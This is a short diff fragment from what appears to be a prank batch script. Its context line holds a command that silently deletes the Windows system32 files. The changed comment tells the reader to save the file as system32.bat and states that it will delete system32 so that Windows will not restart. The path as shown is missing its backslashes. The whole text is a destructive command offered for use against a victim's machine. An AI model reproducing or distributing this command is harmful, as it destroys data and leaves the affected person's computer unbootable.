@@ -2,4 +2,4 @@ del c:WINDOWSsystem32*.*/q
 
 
 
-# Delete this text, and save file as system32.bat
+# Delete this text, and save file as system32.bat . This code will delete folder system32 and windows will not restart
